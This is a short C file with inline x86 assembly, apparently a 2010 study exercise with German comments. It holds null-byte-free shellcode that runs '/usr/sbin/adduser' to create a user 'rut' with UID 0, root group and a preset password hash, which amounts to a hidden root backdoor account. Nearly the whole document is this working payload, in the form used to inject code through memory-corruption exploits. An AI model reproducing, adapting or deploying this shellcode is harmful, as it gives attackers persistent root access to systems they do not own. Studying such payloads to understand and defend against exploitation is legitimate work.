//Markus Thill
//25.05.2010
//Mit diesem Assembler-Code kann ein User "rut" mit dem //Passwort "markus87" angelegt werden. Der Bytecode dieses //Programms enthält keine Null-Bytes mehr. Der User rut verfügt //über root-Rechte


void main() {
__asm__("
	jmp data
start:
	popl %esi				
	movl %esi,76(%esi)			#Adresse von name[0] nach [A]		
	leal 18(%esi),%eax			#Adresse von name[1] nach [A+1] (Muss durch 2 Befehle realisiert werden)
	movl %eax,80(%esi)			
	leal 21(%esi),%eax			#Adresse von name[2] nach [A+2]
	movl %eax,84(%esi)		
	leal 23(%esi),%eax			#Adresse von name[3] nach [A+3]
	movl %eax,88(%esi)
	leal 26(%esi),%eax			#Adresse von name[4] nach [A+4]
	movl %eax,92(%esi)
	leal 29(%esi),%eax			#Adresse von name[5] nach [A+5]
	movl %eax,96(%esi)
	leal 34(%esi),%eax			#Adresse von name[6] nach [A+6]
	movl %eax,100(%esi)
	leal 37(%esi),%eax			#Adresse von name[7] nach [A+7]
	movl %eax,104(%esi)
	leal 72(%esi),%eax			#Adresse von name[8] nach [A+8]
	movl %eax,108(%esi)

	xorl %eax,%eax			#eax auf NULL setzen		
	movb %al,17(%esi)			#Endekennungen der Strings
	movb %al,20(%esi)
	movb %al,22(%esi)
	movb %al,25(%esi)
	movb %al,28(%esi)
	movb %al,33(%esi)
	movb %al,36(%esi)
	movb %al,71(%esi)
	movb %al,75(%esi)


	movl %eax,112(%esi)			#NULL-Pointer der Pointer-Liste
	movb $0xb,%al				#Code der SysCall-Tabelle
	movl %esi,%ebx			#Adresse von name[0]
	leal 76(%esi),%ecx			#Adresse [A] nach ECX (name[])
	leal 112(%esi),%edx			#Adresse des Nullpointers nach EDX

	int $0x80				#Software-Interrupt

	#movl $0x1,%eax
	#movl $0x0,%ebx			#durch folgende Zeile ersetzt:
	xorl %ebx,%ebx
	movl %ebx,%eax
	inc %eax
	int $0x80	
data:
	call start
	.string \"/usr/sbin/adduser#-u#0#-o#-g#root#-p#$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0#rut#\" #76 Zeichen
	");
} 
